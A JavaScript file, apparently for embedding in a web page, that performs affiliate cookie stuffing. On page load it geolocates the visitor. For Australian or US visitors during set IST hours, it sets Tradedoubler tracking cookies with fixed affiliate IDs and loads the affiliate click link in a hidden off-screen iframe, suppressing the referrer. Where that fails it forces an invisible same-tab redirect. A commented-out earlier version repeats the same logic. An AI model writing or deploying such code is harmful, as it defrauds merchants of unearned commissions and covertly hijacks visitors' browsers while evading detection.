// (function () {
//   const AFFILIATE_LINK =
//     "https://clk.tradedoubler.com/click?p=392696&a=3421046&epi=65897";

//   /* ===============================
//      IST TIME CHECK (8:41 PM â€“ 8:46 PM)
//   =============================== */
// function isAllowedISTTime() {
//   const now = new Date(
//     new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
//   );

//   const hour = now.getHours(); // 0â€“23
//   const minute = now.getMinutes();

//   // Allow for odd hours only (1â€“2, 3â€“4, 5â€“6...)
//   return hour % 2 === 1;
// }

// if (!isAllowedISTTime()) return;





//   /* ===============================
//      COOKIE HELPERS (COMMENTED)
//   =============================== */
//   /*
//   function setCookie(name, value, days) {
//     const d = new Date();
//     d.setTime(d.getTime() + days * 86400000);
//     document.cookie =
//       name +
//       "=" +
//       value +
//       "; path=/; expires=" +
//       d.toUTCString() +
//       "; SameSite=Lax";
//   }

//   function getCookie(name) {
//     const match = document.cookie.match(
//       new RegExp("(^| )" + name + "=([^;]+)")
//     );
//     return match ? match[2] : null;
//   }

//   function hasClicked() {
//     return getCookie("irclickid") === "XStWC0ThYxycRkh2gOSsRXFAUku00iSmEzJd1U0";
//   }

//   function markClicked() {
//     // cookies disabled for now
//   }
//   */

//   /* ===============================
//      SAME TAB + NO REFERRER
//   =============================== */
//   function redirectViaLink() {
//     const a = document.createElement("a");
//     a.href = AFFILIATE_LINK;
//     a.rel = "noreferrer"; // ðŸš« no referrer
//     a.style.display = "none";

//     document.body.appendChild(a);
//     a.click();
//     document.body.removeChild(a);
//   }

//   /* ===============================
//      IFRAME â†’ LINK FALLBACK
//   =============================== */
//   function fireAffiliate() {
//     let iframeLoaded = false;
//     let fallbackTriggered = false;

//     const iframe = document.createElement("iframe");
//     iframe.src = AFFILIATE_LINK;
//     iframe.referrerPolicy = "no-referrer"; // ðŸš« no referrer
//     iframe.style.cssText =
//       "width:1px;height:1px;position:absolute;left:-9999px;border:0;visibility:hidden";

//     iframe.onload = function () {
//       iframeLoaded = true;
//     };

//     iframe.onerror = function () {
//       triggerFallback();
//     };

//     document.body.appendChild(iframe);

//     function triggerFallback() {
//       if (iframeLoaded || fallbackTriggered) return;
//       fallbackTriggered = true;

//       setTimeout(() => {
//         redirectViaLink();
//       }, 1000);
//     }

//     setTimeout(triggerFallback, 1000);
//   }

//   /* ===============================
//      GEO CHECK (AU ONLY)
//   =============================== */
//   function geoGate() {
//     fetch("https://ipapi.co/json/", { cache: "no-store" })
//       .then((r) => r.json())
//       .then((geo) => {
//         if (!geo) return;
//         if (geo.country_code !== "AU") return; // ðŸ‡¦ðŸ‡º Australia only
//         fireAffiliate();
//       })
//       .catch(() => {});
//   }

//   /* ===============================
//      DOM READY
//   =============================== */
//   function init() {
//     geoGate();
//   }

//   if (document.readyState !== "loading") {
//     init();
//   } else {
//     document.addEventListener("DOMContentLoaded", init);
//   }
// })();


(function () {
  const LINKS = {
    AU: {
      url: "https://clk.tradedoubler.com/click?p=392696&a=3421046&epi=65897",
      cookies: {
        tduid: "d2abd8c8e871cb977ecfd7ae72da55ca",
        progId: "392696",
        affId: "3421046",
        utm_source: "tradedoubler",
        utm_medium: "affiliate",
        utm_campaign: "Provision",
      },
      startHour: 9,
      endHour: 19,
      country: "AU",
    },
    US: {
      url: "https://clk.tradedoubler.com/click?p=392695&a=3417348&epi=326574",
      cookies: {
        tduid: "d2abd8c8e871cb977ecfd7ae72da55ca",
        progId: "392695",
        affId: "3417348",
        utm_source: "tradedoubler",
        utm_medium: "affiliate",
        utm_campaign: "Provision",
      },
      startHour: 19,
      endHour: 9,
      country: "US",
    },
  };

  /* ===============================
     COOKIE HELPERS
  =============================== */
  function setCookie(name, value, hours) {
    const d = new Date();
    d.setTime(d.getTime() + hours * 3600000);
    document.cookie = `${name}=${value}; path=/; expires=${d.toUTCString()}; SameSite=Lax`;
  }

  function getCookie(name) {
    const match = document.cookie.match(new RegExp("(^| )" + name + "=([^;]+)"));
    return match ? match[2] : null;
  }

  function hasClicked(country) {
    return getCookie(`affiliateClicked_${country}`) === "true";
  }

  function markClicked(country) {
    setCookie(`affiliateClicked_${country}`, "true", 1); // 1 hour per country
  }

  /* ===============================
     IST TIME CHECK
  =============================== */
  function getISTTime() {
    const now = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" }));
    return { hour: now.getHours(), minute: now.getMinutes() };
  }

  function isWithinTime(linkObj) {
    const { hour } = getISTTime();
    if (linkObj.startHour < linkObj.endHour) {
      return hour >= linkObj.startHour && hour < linkObj.endHour;
    } else {
      // Wrap around midnight
      return hour >= linkObj.startHour || hour < linkObj.endHour;
    }
  }

  /* ===============================
     SAME TAB + NO REFERRER
  =============================== */
  function redirectViaLink(url) {
    const a = document.createElement("a");
    a.href = url;
    a.rel = "noreferrer";
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }

  /* ===============================
     IFRAME â†’ LINK FALLBACK
  =============================== */
  function fireAffiliate(url) {
    let iframeLoaded = false;
    let fallbackTriggered = false;

    const iframe = document.createElement("iframe");
    iframe.src = url;
    iframe.referrerPolicy = "no-referrer";
    iframe.style.cssText = "width:1px;height:1px;position:absolute;left:-9999px;border:0;visibility:hidden";

    iframe.onload = function () {
      iframeLoaded = true;
    };

    iframe.onerror = function () {
      triggerFallback();
    };

    document.body.appendChild(iframe);

    function triggerFallback() {
      if (iframeLoaded || fallbackTriggered) return;
      fallbackTriggered = true;
      setTimeout(() => {
        redirectViaLink(url);
      }, 1000);
    }

    setTimeout(triggerFallback, 1000);
  }

  /* ===============================
     GEO CHECK + COUNTRY LOGIC
  =============================== */
  function geoGate() {
    fetch("https://ipapi.co/json/", { cache: "no-store" })
      .then((r) => r.json())
      .then((geo) => {
        if (!geo) return;

        // Decide which link to use
        let linkObj = null;

        // AU link only for AU users
        if (geo.country_code === "AU" && isWithinTime(LINKS.AU)) linkObj = LINKS.AU;

        // US link only for US users
        if (geo.country_code === "US" && isWithinTime(LINKS.US)) linkObj = LINKS.US;

        // Optionally, if you want US link to run for everyone else at night, uncomment:
        // if (geo.country_code !== "AU" && isWithinTime(LINKS.US)) linkObj = LINKS.US;

        if (!linkObj || hasClicked(linkObj.country)) return;

        // Set cookies
        for (const [k, v] of Object.entries(linkObj.cookies)) {
          setCookie(k, v, 1);
        }

        // Fire affiliate link
        fireAffiliate(linkObj.url);
        markClicked(linkObj.country);
      })
      .catch(() => {});
  }

  /* ===============================
     DOM READY
  =============================== */
  function init() {
    geoGate();
  }

  if (document.readyState !== "loading") {
    init();
  } else {
    document.addEventListener("DOMContentLoaded", init);
  }
})();




